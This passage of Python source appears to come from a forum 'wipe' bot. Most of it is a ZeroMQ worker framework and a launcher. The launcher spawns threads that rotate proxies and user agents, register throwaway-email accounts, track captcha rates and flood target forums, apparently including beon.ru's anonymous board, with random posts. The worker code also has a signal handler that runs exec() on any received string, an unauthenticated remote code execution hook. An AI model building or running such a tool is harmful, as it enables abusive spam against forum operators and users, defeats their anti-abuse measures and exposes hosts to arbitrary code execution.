msg.extend(self.make_req_msg(interface, method, args, fun, reqid))\n        return msg\n\n    def make_router_rep_msg(self, reqid, seqnum, status, answer):\n        iden = self.iden_reqid_map.get_key(reqid)\n        if seqnum == 0:\n            self.iden_reqid_map.del_value(iden, reqid)\n        msg = list(iden)\n        msg.append(b'')\n        msg.extend(make_rep_msg(reqid, seqnum, status, answer))\n        return msg\n\n    def get_iden(self, reqid):\n        return self.iden_reqid_map.get_key(reqid)\n\n    def get_reqids(self, iden):\n        return self.iden_reqid_map.get_values(iden)\n\n    def make_reqid(self):\n        while True:\n            reqid = random.randint(1, (2**64)-1)\n            if reqid not in self.response_handlers:\n                return reqid\n\n    def make_auth_req_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n        return (b'Router', b'auth-request', args, reqid)\n\n    def make_auth_bind_route_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n        return (b'Router', b'auth-bind-route', args, reqid)\n\n    def make_auth_unbind_route_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n        return (b'Router', b'auth-unbind-route', args, reqid)\n\n    def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, struct.pack('!B', type_),\n                make_auth_hash(interface, method, reqid, key)]\n        return (b'Router', b'auth-set-route-type', args, reqid)\n\n    def make_auth_clear_data(self, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        return (b'Router', b'auth-clear', [], reqid)\n\n    def req_from_data(self, d, fun):\n        return self.make_req_msg(d[0], d[1], d[2], fun, d[3])\n\n    def _parse_err(self, iden, msg, status):\n        pass\n\n    def _handle_nil(self, iden, msg):\n        pass\n/n/n/nlib/wzworkers.py/n/nimport zmq\nimport threading, multiprocessing\nimport logging\nfrom sup.ticker import Ticker\n# from sup import split_frames\nimport wzrpc\nimport exceptions\nfrom wzrpc.wzhandler import WZHandler\nimport wzauth_data\n\nclass WorkerInterrupt(Exception):\n    '''Exception to raise when self.running is cleared'''\n    def __init__(self):\n        super().__init__('Worker was interrupted at runtime')\n\nclass Suspend(Exception):\n    # if we need this at all.\n    '''Exception to raise on suspend signal'''\n    def __init__(self, interval, *args, **kvargs):\n        self.interval = interval\n        super().__init__(*args, **kvargs)\n\nclass Resume(Exception):\n    '''Exception to raise when suspend sleep is interrupted'''\n\nclass WZWorkerBase:\n    def __init__(self, wz_addr, fun, args=(), kvargs={},\n            name=None, start_timer=None, poll_timeout=None,\n            pargs=(), pkvargs={}):\n        super().__init__(*pargs, **pkvargs)\n        self.name = name if name else type(self).__name__\n        self.start_timer = start_timer\n        self.poll_timeout = poll_timeout if poll_timeout else 5*1000\n        self.call = (fun, args, kvargs)\n\n        self.wz_addr = wz_addr\n        self.wz_auth_requests = []\n        self.wz_bind_methods = []\n        self.wz_poll_timeout = 30 * 1000\n        self.wz_retry_timeout = 5\n\n    def __sinit__(self):\n        '''Initializes thread-local interface on startup'''\n        self.log = logging.getLogger(self.name)\n        self.running = threading.Event()\n        self.sleep_ticker = Ticker()\n        self.poller = zmq.Poller()\n\n        s = self.ctx.socket(zmq.SUB)\n        self.poller.register(s, zmq.POLLIN)\n        s.setsockopt(zmq.IPV6, True)\n        s.connect(self.sig_addr)\n        s.setsockopt(zmq.SUBSCRIBE, b'GLOBAL')\n        s.setsockopt(zmq.SUBSCRIBE, b'WZWorker')\n        s.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))\n        self.sig_sock = s\n\n        s = self.ctx.socket(zmq.DEALER)\n        self.poller.register(s, zmq.POLLIN)\n        s.setsockopt(zmq.IPV6, True)\n        self.wz_sock = s\n\n        self.wz = WZHandler()\n\n        def term_handler(i, m, d):\n            self.log.info(\n                'Termination signal %s recieved',\n                repr((i, m, d)))\n            self.term()\n            raise WorkerInterrupt()\n        self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler)\n\n        def execute_handler(i, m, d):\n            if len(d) < 1:\n                return\n            try:\n                exec(d[0].decode('utf-8'))\n            except Exception as e:\n                self.log.exception(e)\n        self.wz.set_sig_handler(b'WZWorker', b'execute', execute_handler)\n\n        def suspend_handler(i, m, d):\n            if len(d) != 1:\n                self.log.waring('Suspend signal without a time recieved, ignoring')\n            self.log.info('Suspend signal %s recieved', repr((i, m, d)))\n            try:\n                t = int(d[0])\n                # raise Suspend(t)\n                self.inter_sleep(t)\n            except Resume as e:\n                self.log.info(e)\n            except Exception as e:\n                self.log.error(e)\n        self.wz.set_sig_handler(b'WZWorker', b'suspend', suspend_handler)\n\n        def resume_handler(i, m, d):\n            self.log.info('Resume signal %s recieved', repr((i, m, d)))\n            raise Resume()\n        self.wz.set_sig_handler(b'WZWorker', b'resume', resume_handler)\n\n        self.running.set()\n\n    def wz_connect(self):\n        self.wz_sock.connect(self.wz_addr)\n\n    def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):\n        s, p, t = self.wz_sock, self.poll, self.sleep_ticker\n        timeout = timeout if timeout else self.wz_poll_timeout\n        rs = wzrpc.RequestState(fun)\n        msg = self.wz.make_req_msg(interface, method, data,\n                                   rs.accept, reqid)\n        msg.insert(0, b'')\n        s.send_multipart(msg)\n        t.tick()\n        while self.running.is_set():\n            p(timeout*1000)\n            if rs.finished:\n                if rs.retry:\n                    self.inter_sleep(self.wz_retry_timeout)\n                    msg = self.wz.make_req_msg(interface, method, data,\n                        rs.accept, reqid)\n                    msg.insert(0, b'')\n                    s.send_multipart(msg)\n                    rs.finished = False\n                    rs.retry = False\n                    continue\n                return\n            elapsed = t.elapsed(False)\n            if elapsed >= timeout:\n                t.tick()\n                # Notify fun about the timeout\n                rs.accept(None, 0, 255, [elapsed])\n                # fun sets rs.retry = True if it wants to retry\n        raise WorkerInterrupt()\n\n    def wz_multiwait(self, requests):\n        # TODO: rewrite the retry loop\n        s, p, t = self.wz_sock, self.poll, self.sleep_ticker\n        timeout = self.wz_poll_timeout\n        rslist = []\n        msgdict = {}\n        for request in requests:\n            rs = wzrpc.RequestState(request[0])\n            rslist.append(rs)\n            msg = self.wz.make_req_msg(request[1][0], request[1][1], request[1][2],\n                                    rs.accept, request[1][3])\n            msg.insert(0, b'')\n            msgdict[rs] = msg\n            s.send_multipart(msg)\n        while self.running.is_set():\n            flag = 0\n            for rs in rslist:\n                if rs.finished:\n                    if not rs.retry:\n                        del msgdict[rs]\n                        continue\n                    s.send_multipart(msgdict[rs])\n                    rs.finished = False\n                    rs.retry = False\n                flag = 1\n            if not flag:\n                return\n            # check rs before polling, since we don't want to notify finished one\n            # about the timeout\n            t.tick()\n            p(timeout*1000)\n            if t.elapsed(False) >= timeout:\n                for rs in rslist:\n                    if not rs.finished:\n                        rs.accept(None, 0, 255, []) # Notify fun about the timeout\n                        rs.finished = True # fun sets rs.retry = True if it wants to retry\n        raise WorkerInterrupt()\n\n    def auth_requests(self):\n        for i, m in self.wz_auth_requests:\n            def accept(that, reqid, seqnum, status, data):\n                if status == wzrpc.status.success:\n                    self.log.debug('Successfull auth for (%s, %s)', i, m)\n                elif status == wzrpc.status.e_auth_wrong_hash:\n                    raise exceptions.PermanentError(\n                        'Cannot authentificate for ({0}, {1}), {2}: {3}'.\\\n                        format(i, m, wzrpc.name_status(status), repr(data)))\n                elif wzrpc.status.e_timeout:\n                    self.log.warn('Timeout {0}, retrying'.format(data[0]))\n                    that.retry = True\n                else:\n                    self.log.warning('Recvd unknown reply for (%s, %s) %s: %s', i, m,\n                        wzrpc.name_status(status), repr(data))\n            self.wz_wait_reply(accept,\n                *self.wz.make_auth_req_data(i, m, wzauth_data.request[i, m]))\n\n\n    def bind_route(self, i, m, f):\n        self.log.debug('Binding %s,%s route', i, m)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.wz.set_req_handler(i, m, f)\n                self.log.debug('Succesfully binded route (%s, %s)', i, m)\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\\\n                    format(wzrpc.name_status(status)))\n                self.auth_requests()\n            elif wzrpc.status.e_timeout:\n                self.log.warn('Timeout {0}, retrying'.format(data[0]))\n                that.retry = True\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        return self.wz_wait_reply(accept,\n                *self.wz.make_auth_bind_route_data(i, m, wzauth_data.bind_route[i, m]))\n\n    def set_route_type(self, i, m, t):\n        self.log.debug('Setting %s,%s type to %d', i, m, t)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Succesfully set route type for (%s, %s) to %s', i, m,\n                    wzrpc.name_route_type(t))\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\\\n                    format(wzrpc.name_status(status)))\n                self.auth_requests()\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        return self.wz_wait_reply(accept,\n            *self.wz.make_auth_set_route_type_data(i, m, t,\n                wzauth_data.set_route_type[i, m]))\n\n    def unbind_route(self, i, m):\n        if not (i, m) in self.wz.req_handlers:\n            self.log.debug('Route %s,%s was not bound', i, m)\n            return\n        self.log.debug('Unbinding route %s,%s', i, m)\n        self.wz.del_req_handler(i, m)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Route unbinded for (%s, %s)', i, m)\n            else:\n                self.log.warn('Status %s, passing', wzrpc.name_status(status))\n        return self.wz_wait_reply(accept,\n            *self.wz.make_auth_unbind_route_data(i, m, wzauth_data.bind_route[i, m]))\n\n    def clear_auth(self):\n        self.log.debug('Clearing our auth records')\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Auth records on router were cleared')\n            else:\n                self.log.warn('Status %s, passing', wzrpc.name_status(status))\n        return self.wz_wait_reply(accept, *self.wz.make_auth_clear_data())\n\n    def bind_methods(self):\n        for i, m, f, t in self.wz_bind_methods:\n            self.set_route_type(i, m, t)\n            self.bind_route(i, m, f)\n\n    def unbind_methods(self):\n        for i, m, f, t in self.wz_bind_methods:\n            self.unbind_route(i, m)\n        # self.clear_auth()\n\n    def send_rep(self, reqid, seqnum, status, data):\n        self.wz_sock.send_multipart(\n            self.wz.make_router_rep_msg(reqid, seqnum, status, data))\n\n    def send_success_rep(self, reqid, data):\n        self.send_rep(reqid, 0, wzrpc.status.success, data)\n\n    def send_error_rep(self, reqid, data):\n        self.send_rep(reqid, 0, wzrpc.status.error, data)\n\n    def send_wz_error(self, reqid, data, seqid=0):\n        msg = self.wz.make_dealer_rep_msg(\n            reqid, seqid, wzrpc.status.error, data)\n        self.wz_sock.send_multipart(msg)\n\n    def send_to_router(self, msg):\n        msg.insert(0, b'')\n        self.wz_sock.send_multipart(msg)\n    \n    # def bind_sig_route(self, routetype, interface, method, fun):\n    #     self.log.info('Binding %s,%s as type %d signal route',\n    #                   interface, method, routetype)\n    #     self.wz.set_signal_handler(interface, method, fun)\n    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'bind-sig-route',\n    #                                       [interface, method],\n    #                                       self.accept_ok)\n    #     self.wz_sock.send_multipart(msg)\n\n    # def unbind_sig_route(self, interface, method):\n    #     self.log.info('Deleting %s,%s signal route', interface, method)\n    #     self.wz.del_signal_handler(interface, method)\n    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'unbind-sig-route',\n    #                                       [interface, method],\n    #                                       self.accept_ok)\n    #     self.wz_sock.send_multipart(msg)\n\n    def inter_sleep(self, timeout):\n        self.sleep_ticker.tick()\n        while self.sleep_ticker.elapsed(False) < timeout:\n            try:\n                self.poll(timeout * 1000)\n            except Resume:\n                return\n\n    def poll(self, timeout=None):\n        try:\n            socks = dict(self.poller.poll(timeout if timeout is not None\n                else self.poll_timeout))\n        except zmq.ZMQError as e:\n            self.log.error(e)\n            return\n        if socks.get(self.sig_sock) == zmq.POLLIN:\n            # No special handling or same-socket replies are necessary for signals.\n            # Backwards socket replies may be added here.\n            frames = self.sig_sock.recv_multipart()\n            try:\n                self.wz.parse_msg(frames[0], frames[1:])\n            except wzrpc.WZError as e:\n                self.log.warn(e)\n        if socks.get(self.wz_sock) == zmq.POLLIN:\n            self.process_wz_msg(self.wz_sock.recv_multipart())\n        return socks\n\n    def process_wz_msg(self, frames):\n        try:\n            for nfr in self.wz.parse_router_msg(frames):\n                # Send replies from the handler, for cases when its methods were rewritten\n                self.wz_sock.send_multipart(nfr)\n        except wzrpc.WZErrorRep as e:\n            self.log.info(e)\n            self.wz_sock.send_multipart(e.rep_msg)\n        except wzrpc.WZError as e:\n            self.log.warn(e)\n\n    def run(self):\n        self.__sinit__()\n        if self.start_timer:\n            self.inter_sleep(self.start_timer)\n        if self.running:\n            self.log.info('Starting')\n            try:\n                self.child = self.call[0](*self.call[1], **self.call[2])\n                self.child(self)\n            except WorkerInterrupt as e:\n                self.log.warn(e)\n            except Exception as e:\n                self.log.exception(e)\n            self.log.info('Terminating')\n        else:\n            self.log.info('Aborted')\n        self.running.set() # wz_multiwait needs this to avoid another state check.\n        self.unbind_methods()\n        self.running.clear()\n        self.wz_sock.close()\n        self.sig_sock.close()\n\n    def term(self):\n        self.running.clear()\n\n\nclass WZWorkerThread(WZWorkerBase, threading.Thread):\n    def start(self, ctx, sig_addr, *args, **kvargs):\n        self.ctx = ctx\n        self.sig_addr = sig_addr\n        threading.Thread.start(self, *args, **kvargs)\n\nclass WZWorkerProcess(WZWorkerBase, multiprocessing.Process):\n    def start(self, sig_addr, *args, **kvargs):\n        self.sig_addr = sig_addr\n        multiprocessing.Process.start(self, *args, **kvargs)\n\n    def __sinit__(self):\n        self.ctx = zmq.Context()\n        super().__sinit__()\n/n/n/nunistart.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nimport sys\nif 'lib' not in sys.path:\n    sys.path.append('lib')\nimport os, signal, logging, threading, re, traceback, time\nimport random\nimport zmq\nfrom queue import Queue\nimport sup\nimport wzworkers as workers\nfrom dataloader import DataLoader\nfrom uniwipe import UniWipe\nfrom wipeskel import *\nimport wzrpc\nfrom beon import regexp\nimport pickle\n\nfrom logging import config\nfrom logconfig import logging_config\nconfig.dictConfig(logging_config)\nlogger = logging.getLogger()\n\nctx = zmq.Context()\nsig_addr = 'ipc://signals'\nsig_sock = ctx.socket(zmq.PUB)\nsig_sock.bind(sig_addr)\n\n# Settings for you\ndomains = set() # d.witch_domains\ntargets = dict() # d.witch_targets\nprotected = set() # will be removed later\nforums = dict() # target forums\n\n# from lib import textgen\n# with open('data.txt', 'rt') as f:\n#     model = textgen.train(f.read())\n# def mesasge():\n#     while True:\n#         s = textgen.generate_sentence(model)\n#         try:\n#             s.encode('cp1251')\n#             break\n#         except Exception:\n#             continue\n#     return s\n\ndef message():\n    msg = []\n    # msg.append('[video-youtube-'+\n    #            random.choice(('3odl-KoNZwk', 'bu55q_3YtOY', '4YPiCeLwh5o',\n    #                           'eSBybJGZoCU', 'ZtWTUt2RZh0', 'VXa9tXcMhXQ',))\n    #            +']')\n    msg.append('[image-original-none-http://simg4.gelbooru.com/'\n               + '/images/db/1d/db1dfb62a40f5ced2043bb8966da9a98.png]')\n    msg.append('\u041a\u0430\u0436\u0434\u044b\u0439 \u0445\u043e\u0447\u0435\u0442 \u0434\u0440\u0443\u0436\u0438\u0442\u044c \u0441 \u044f\u0434\u0435\u0440\u043d\u043e\u0439 \u0431\u043e\u043c\u0431\u043e\u0439.')\n    # msg.append('[video-youtube-'+random.choice(\n    #     # ('WdDb_RId-xU', 'EFL1-fL-WtM', 'uAOoiIkFQq4',\n    #     #  'eZO3K_4yceU', '1c1lT_HgJNo', 'WOkvVVaJ2Ks',\n    #     #  'KYq90TEdxIE', 'rWBM2whL0bI', '0PDy_MKYo4A'))\n    #     #('GabBLLOT6vw', 'qgvOpSquCAY', 'zUe-z9DZBNo', '4fCbfDEKZss', 'uIE-JgmkmdM'))\n    #     ('42JQYPioVo4', 'jD6j072Ep1M', 'mPyF5ovoIVs', 'cEEi1BHycb0', 'PuA1Wf8nkxw',\n    #      'ASJ9qlsPgHU', 'DP1ZDW9_xOo', 'bgSqH9LT-mI', ))\n    # +']')\n    # http://simg2.gelbooru.com//images/626/58ca1c9a8ffcdedd0e2eb6f33c9389cb7588f0d1.jpg\n    # msg.append('Enjoy the view!')\n    msg.append(str(random.randint(0, 9999999999)))\n    return '\\n'.join(msg)\n\ndef sbjfun():\n    # return 'Out of the darkness we will rise, into the light we will dwell'\n    return sup.randstr(1, 30)\n\n# End\nimport argparse\n\nparser = argparse.ArgumentParser(add_help=True)\nparser.add_argument('--only-cache', '-C', action='store_true',\n    help=\"Disables any requests in DataLoader (includes Witch)\")\nparser.add_argument('--no-shell', '-N', action='store_true',\n    help=\"Sleep instead of starting the shell\")\nparser.add_argument('--tcount', '-t', type=int, default=10,\n    help='WipeThread count')\nparser.add_argument('--ecount', '-e', type=int, default=0,\n    help='EvaluatorProxy count')\nparser.add_argument('--upload-avatar', action='store_true', default=False,\n    help='Upload random avatar after registration')\nparser.add_argument('--av-dir', default='randav', help='Directory with avatars')\nparser.add_argument('--rp-timeout', '-T', type=int, default=10,\n    help='Default rp timeout in seconds')\nparser.add_argument('--conlimit', type=int, default=3,\n    help='http_request conlimit')\nparser.add_argument('--noproxy-timeout', type=int, default=5,\n    help='noproxy_rp timeout')\n\nparser.add_argument('--caprate_minp', type=int, default=5,\n    help='Cap rate minimum possible count for limit check')\nparser.add_argument('--caprate_limit', type=float, default=0.8,\n    help='Captcha rate limit')\n\nparser.add_argument('--comment_successtimeout', type=float, default=0.8,\n    help='Comment success timeout')\nparser.add_argument('--topic_successtimeout', type=float, default=0.1,\n    help='Topic success timeout')\nparser.add_argument('--errortimeout', type=float, default=3,\n    help='Error timeout')\n\n\nparser.add_argument('--stop-on-closed', action='store_true', default=False,\n    help='Forget about closed topics')\nparser.add_argument('--die-on-neterror', action='store_true', default=False,\n    help='Terminate spawn in case of too many NetErrors')\n\nc = parser.parse_args()\n\n# rps = {}\n\nnoproxy_rp = sup.net.RequestPerformer()\nnoproxy_rp.proxy = ''\nnoproxy_rp.timeout = c.noproxy_timeout\nnoproxy_rp.timeout = c.rp_timeout\n\n# rps[''] = noproxy_rp\n\n# Achtung: DataLoader probably isn't thread-safe.\nd = DataLoader(noproxy_rp, c.only_cache)\nc.router_addr = d.addrs['rpcrouter']\nnoproxy_rp.useragent = random.choice(d.ua_list)\n\ndef terminate():\n    logger.info('Shutdown initiated')\n    # send_passthrough([b'GLOBAL', b'WZWorker', b'terminate'])\n    send_to_wm([b'GLOBAL', b'WZWorker', b'terminate'])\n    for t in threading.enumerate():\n        if isinstance(t, threading.Timer):\n            t.cancel()\n    # try:\n    #     wm.term()\n    #     wm.join()\n    # except: # WM instance is not created yet.\n    #     pass\n    logger.info('Exiting')\n\ndef interrupt_handler(signal, frame):\n    pass # Just do nothing\n\ndef terminate_handler(signal, frame):\n    terminate()\n\nsignal.signal(signal.SIGINT, interrupt_handler)\nsignal.signal(signal.SIGTERM, terminate_handler)\n\ndef make_net(proxy, proxytype):\n    # if proxy in rps:\n    #     return rps[proxy]\n    net = sup.net.RequestPerformer()\n    net.proxy = proxy\n    if proxytype == 'HTTP' or proxytype == 'HTTPS':\n        net.proxy_type = sup.proxytype.http\n    elif proxytype == 'SOCKS4':\n        net.proxy_type = sup.proxytype.socks4\n    elif proxytype == 'SOCKS5':\n        net.proxy_type = sup.proxytype.socks5\n    else:\n        raise TypeError('Invalid proxytype %s' % proxytype)\n    # rps[proxy] = net\n    net.useragent = random.choice(d.ua_list)\n    net.timeout = c.rp_timeout\n    return net\n\n# UniWipe patching start\ndef upload_avatar(self, ud):\n    if ('avatar_uploaded' in ud[0] and\n        ud[0]['avatar_uploaded'] is True):\n        return\n    files = []\n    for sd in os.walk(c.av_dir):\n        files.extend(sd[2])\n    av = os.path.join(sd[0], random.choice(files))\n    self.log.info('Uploading %s as new avatar', av)\n    self.site.uploadavatar('0', av)\n    ud[0]['avatar'] = av\n    ud[0]['avatar_uploaded'] = True\n\nfrom lib.mailinator import Mailinator\n# from lib.tempmail import TempMail as Mailinator\n\n# Move this to WipeManager\ndef create_spawn(proxy, proxytype, pc, uq=None):\n    for domain in domains:\n        if domain in targets:\n            tlist = targets[domain]\n        else:\n            tlist = list()\n            targets[domain] = tlist\n        if domain in forums:\n            fset = forums[domain]\n        else:\n            fset = set()\n            forums[domain] = fset\n        net = make_net(proxy, proxytype)\n        net.cookiefname = (proxy if proxy else 'noproxy')+'_'+domain\n        w = UniWipe(fset, tlist, sbjfun, message, pc, net, domain, Mailinator,\n            uq(domain) if uq else None)\n        w.stoponclose = c.stop_on_closed\n        w.die_on_neterror = c.die_on_neterror\n        w.caprate_minp = c.caprate_minp\n        w.caprate_limit = c.caprate_limit\n        w.conlimit = c.conlimit\n        w.comment_successtimeout = 0.2\n        if c.upload_avatar:\n            w.hooks['post_login'].append(upload_avatar)\n        yield w\n\n# UniWipe patching end\n\nclass WipeManager:\n    def __init__(self, config, *args, **kvargs):\n        super().__init__(*args, **kvargs)\n        self.newproxyfile = 'newproxies.txt'\n        self.proxylist = set()\n        self.c = config\n        self.threads = []\n        self.processes = []\n        self.th_sa = 'inproc://wm-wth.sock'\n        self.th_ba = 'inproc://wm-back.sock'\n        self.pr_sa = 'ipc://wm-wpr.sock'\n        self.pr_ba = 'ipc://wm-back.sock'\n        self.userqueues = {}\n        self.usersfile = 'wm_users.pickle'\n        self.targetsfile = 'wm_targets.pickle'\n        self.bumplimitfile = 'wm_bumplimit.pickle'\n\n    def init_th_sock(self):\n        self.log.info(\n            'Initializing intraprocess signal socket %s', self.th_sa)\n        self.th_sock = self.p.ctx.socket(zmq.PUB)\n        self.th_sock.bind(self.th_sa)\n\n    def init_th_back_sock(self):\n        self.log.info(\n            'Initializing intraprocess backward socket %s', self.th_ba)\n        self.th_back_sock = self.p.ctx.socket(zmq.ROUTER)\n        self.th_back_sock.bind(self.th_ba)\n\n    def init_pr_sock(self):\n        self.log.info(\n            'Initializing interprocess signal socket %s', self.pr_sa)\n        self.pr_sock = self.p.ctx.socket(zmq.PUB)\n        self.pr_sock.bind(self.pr_sa)\n\n    def init_pr_back_sock(self):\n        self.log.info(\n            'Initializing interprocess backward socket %s', self.pr_ba)\n        self.pr_back_sock = self.p.ctx.socket(zmq.ROUTER)\n        self.pr_back_sock.bind(self.pr_ba)\n\n    def read_newproxies(self):\n        if not os.path.isfile(self.newproxyfile):\n            return\n        newproxies = set()\n        with open(self.newproxyfile, 'rt') as f:\n            for line in f:\n                try:\n                    line = line.rstrip('\\n')\n                    proxypair = tuple(line.split(' '))\n                    if len(proxypair) < 2:\n                        self.log.warning('Line %s has too few spaces', line)\n                        continue\n                    if len(proxypair) > 2:\n                        self.log.debug('Line %s has too much spaces', line)\n                        proxypair = (proxypair[0], proxypair[1])\n                    newproxies.add(proxypair)\n                except Exception as e:\n                    self.log.exception('Line %s raised exception %s', line, e)\n        # os.unlink(self.newproxyfile)\n        return newproxies.difference(self.proxylist)\n\n    def add_spawns(self, proxypairs):\n        while self.running.is_set():\n            try:\n                try:\n                    proxypair = proxypairs.pop()\n                except Exception:\n                    return\n                self.proxylist.add(proxypair)\n                for spawn in create_spawn(proxypair[0], proxypair[1], self.pc,\n                        self.get_userqueue):\n                    self.log.info('Created spawn %s', spawn.name)\n                    self.spawnqueue.put(spawn, False)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on create_spawn', e)\n\n    def spawn_workers(self, wclass, count, args=(), kvargs={}):\n        wname = str(wclass.__name__)\n        self.log.info('Starting %s(s)', wname)\n        if issubclass(wclass, workers.WZWorkerThread):\n            type_ = 0\n            if not hasattr(self, 'th_sock'):\n                self.init_th_sock()\n            if not hasattr(self, 'th_back_sock'):\n                self.init_th_back_sock()\n        elif issubclass(wclass, workers.WZWorkerProcess):\n            type_ = 1\n            if not hasattr(self, 'pr_sock'):\n                self.init_pr_sock()\n            if not hasattr(self, 'pr_back_sock'):\n                self.init_pr_back_sock()\n        else:\n            raise Exception('Unknown wclass type')\n        for i in range(count):\n            if not self.running.is_set():\n                break\n            try:\n                w = wclass(*args, name='.'.join(\n                    (wname, ('pr{0}' if type_ else 'th{0}').format(i))),\n                    **kvargs)\n                if type_ == 0:\n                    self.threads.append(w)\n                    w.start(self.p.ctx, self.th_sa)\n                elif type_ == 1:\n                    self.processes.append(w)\n                    w.start(self.pr_sa)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on %s spawn',\n                                   e, wname)\n\n    def spawn_nworkers(self, type_, fun, count, args=(), kvargs={}):\n        wname = str(fun.__name__)\n        self.log.info('Starting %s(s)', wname)\n        if type_ == 0:\n            if not hasattr(self, 'th_sock'):\n                self.init_th_sock()\n            if not hasattr(self, 'th_back_sock'):\n                self.init_th_back_sock()\n        elif type_ == 1:\n            if not hasattr(self, 'pr_sock'):\n                self.init_pr_sock()\n            if not hasattr(self, 'pr_back_sock'):\n                self.init_pr_back_sock()\n        else:\n            raise Exception('Unknown wclass type')\n        for i in range(count):\n            if not self.running.is_set():\n                break\n            try:\n                if type_ == 0:\n                    w = workers.WZWorkerThread(\n                        self.c.router_addr, fun, args, kvargs,\n                        name='.'.join((wname, 'th{0}'.format(i))))\n                    self.threads.append(w)\n                    w.start(self.p.ctx, self.th_sa)\n                elif type_ == 1:\n                    w = workers.WZWorkerProcess(self.c.router_addr, fun, args, kvargs,\n                        name='.'.join((wname, 'pr{0}'.format(i))))\n                    self.processes.append(w)\n                    w.start(self.pr_sa)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on %s spawn',\n                                   e, wname)\n\n    def spawn_wipethreads(self):\n        return self.spawn_nworkers(0, WipeThread, self.c.tcount,\n                                  (self.pc, self.spawnqueue))\n\n    def spawn_evaluators(self):\n        self.log.info('Initializing Evaluator')\n        from evproxy import EvaluatorProxy\n        def ev_init():\n            from lib.evaluators.PyQt4Evaluator import Evaluator\n            return Evaluator()\n        return self.spawn_nworkers(1, EvaluatorProxy, self.c.ecount,\n                                  (ev_init,))\n\n    def load_users(self):\n        if not os.path.isfile(self.usersfile):\n            return\n        with open(self.usersfile, 'rb') as f:\n            users = pickle.loads(f.read())\n        try:\n            for domain in users.keys():\n                uq = Queue()\n                for ud in users[domain]:\n                    self.log.debug('Loaded user %s:%s', domain, ud['login'])\n                    uq.put(ud)\n                self.userqueues[domain] = uq\n        except Exception as e:\n            self.log.exception(e)\n            self.log.error('Failed to load users')\n\n    def save_users(self):\n        users = {}\n        for d, uq in self.userqueues.items():\n            uqsize = uq.qsize()\n            uds = []\n            for i in range(uqsize):\n                uds.append(uq.get(False))\n            users[d] = uds\n        with open(self.usersfile, 'wb') as f:\n            f.write(pickle.dumps(users, pickle.HIGHEST_PROTOCOL))\n        self.log.info('Saved users')\n\n    def get_userqueue(self, domain):\n        try:\n            uq = self.userqueues[domain]\n        except KeyError:\n            self.log.info('Created userqueue for %s', domain)\n            uq = Queue()\n            self.userqueues[domain] = uq\n        return uq\n\n    def load_targets(self):\n        fname = self.targetsfile\n        if not os.path.isfile(fname):\n            return\n        with open(fname, 'rb') as f:\n            data = pickle.loads(f.read())\n        if 'targets' in data:\n            self.log.debug('Target list was loaded')\n            targets.update(data['targets'])\n        if 'forums' in data:\n            self.log.debug('Forum set was loaded')\n            forums.update(data['forums'])\n        if 'domains' in data:\n            self.log.debug('Domain set was loaded')\n            domains.update(data['domains'])\n        if 'sets' in data:\n            self.log.debug('Other sets were loaded')\n            self.pc.sets.update(data['sets'])\n\n    def load_bumplimit_set(self):\n        if not os.path.isfile(self.bumplimitfile):\n            return\n        with open(self.bumplimitfile, 'rb') as f:\n            self.pc.sets['bumplimit'].update(pickle.loads(f.read()))\n\n    def save_targets(self):\n        data = {\n            'targets': targets,\n            'forums': forums,\n            'domains': domains,\n            'sets': self.pc.sets,\n        }\n        with open(self.targetsfile, 'wb') as f:\n            f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL))\n\n    def targets_from_witch(self):\n        for t in d.witch_targets:\n            if t['domain'] == 'beon.ru' and t['forum'] == 'anonymous':\n                try:\n                    add_target_exc(t['id'], t['user'])\n                except ValueError:\n                    pass\n\n    def terminate(self):\n        msg = [b'GLOBAL']\n        msg.extend(wzrpc.make_sig_msg(b'WZWorker', b'terminate', []))\n        if hasattr(self, 'th_sock'):\n            self.th_sock.send_multipart(msg)\n        if hasattr(self, 'pr_sock'):\n            self.pr_sock.send_multipart(msg)\n\n    def join_threads(self):\n        for t in self.threads:\n            t.join()\n\n    def send_passthrough(self, interface, method, frames):\n        msg = [frames[0]]\n        msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))\n        self.th_sock.send_multipart(msg)\n        self.pr_sock.send_multipart(msg)\n\n    def __call__(self, parent):\n        self.p = parent\n        self.log = parent.log\n        self.inter_sleep = parent.inter_sleep\n        self.running = parent.running\n        self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeManager')\n        self.p.wz.set_sig_handler(b'WipeManager', b'passthrough', self.send_passthrough)\n        if self.c.tcount > 0:\n            self.pc = ProcessContext(self.p.name, self.p.ctx,\n                self.c.router_addr, noproxy_rp)\n            self.spawnqueue = Queue()\n            self.load_bumplimit_set()\n            self.load_targets()\n            self.load_users()\n            self.spawn_wipethreads()\n        if self.c.ecount > 0:\n            self.spawn_evaluators()\n        try:\n            while 